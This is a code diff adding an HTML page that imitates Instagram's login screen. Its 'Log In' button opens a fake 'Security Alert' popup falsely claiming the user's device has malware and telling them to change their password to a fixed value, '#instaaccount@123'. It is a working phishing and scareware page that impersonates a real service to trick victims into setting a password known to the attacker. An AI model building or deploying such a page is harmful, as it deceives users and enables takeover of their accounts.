@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fafafa;
+        }
+        .login-container {
+            width: 300px;
+            padding: 20px;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .login-container h1 {
+            text-align: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+        }
+        .login-container input {
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #2874c6;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="button" onclick="openNewPage()">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        function openNewPage() {
+            // Open a new page with a specific message
+            const newWindow = window.open("", "_blank", "width=400,height=400");
+            newWindow.document.write(`
+                <html>
+                <head>
+                    <title>Security Alert</title>
+                    <style>
+                        body {
+                            font-family: Arial, sans-serif;
+                            text-align: center;
+                            background-color: #f8f9fa;
+                            margin: 0;
+                            padding: 20px;
+                        }
+                        h1 {
+                            color: red;
+                        }
+                        p {
+                            color: #333;
+                        }
+                        .important {
+                            font-weight: bold;
+                            color: blue;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>Security Alert</h1>
+                    <p>Your Instagram account is under control of someone who installed malware on your device.</p>
+                    <p class="important">To protect your account, change your password to <strong>#instaaccount@123</strong>.</p>
+                    <p>Following this action will help secure your account from malware attacks. Stay safe!</p>
+                </body>
+                </html>
+            `);
+        }
+    </script>
+</body>
+</html>
